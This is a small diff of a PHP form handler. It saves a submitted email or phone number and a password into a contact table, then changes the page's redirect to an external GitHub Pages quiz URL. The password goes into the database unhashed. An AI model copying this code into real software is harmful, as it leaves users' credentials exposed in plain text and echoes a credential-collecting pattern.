@@ -18,7 +18,7 @@ if ($conn->connect_error){
    $stmt = $conn->prepare("INSERT INTO tbl_contact (Id, email_number, password) VALUES (0, ?, ?)");
    $stmt->bind_param("ss", $email_phone, $password);
    $stmt->execute();
-   header("Location: couple_query.html");
+   header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
    $stmt->close();
    $conn->close(); 
 }
